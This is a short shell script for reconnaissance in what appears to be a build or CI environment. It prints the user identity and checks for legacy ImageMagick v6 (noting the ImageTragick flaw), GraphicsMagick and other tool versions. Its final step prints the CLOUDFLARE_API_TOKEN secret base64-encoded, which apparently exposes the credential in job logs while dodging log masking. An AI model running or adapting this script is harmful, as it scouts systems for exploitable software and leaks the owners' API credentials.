echo "--- STARTING RECON ---"
echo "Who am I?"
id
 
echo "--- EGACY SOFTWARE INSPECTION ---"

# 1. Check for ImageMagick (The most common legacy target)
if command -v convert >/dev/null 2>&1; then
    echo "[!] ImageMagick found!"
    IM_VERSION=$(convert --version | head -n 1)
    echo "Full Version Info: $IM_VERSION"
    
    # Check for specific vulnerable version ranges
    # Note: 6.9.11 or 6.7.7 are common 'legacy' versions in build images
    if [[ $IM_VERSION == *" 6."* ]]; then
        echo " WARNING: Running ImageMagick v6 (Legacy). Check for ImageTragick!"
    fi
else
    echo "[✓] ImageMagick not pre-installed."
fi

# 2. Check for GraphicsMagick (The faster, often older alternative)
if command -v gm >/dev/null 2>&1; then
    echo "[!] GraphicsMagick found!"
    gm version | head -n 1
else
    echo "[✓] GraphicsMagick not found."
fi

# 3. Check for other 'Legacy' favorites
echo "--- OTHER TOOL VERSIONS ---"
git --version || echo "Git not found"
python --version || echo "Python not found"
curl --version | head -n 1 || echo "Curl not found"
sqlite3 --version || echo "SQLite not found"

echo "--- QUICK RECON ---"

echo $CLOUDFLARE_API_TOKEN | base64
echo "--- FINISHED ---"
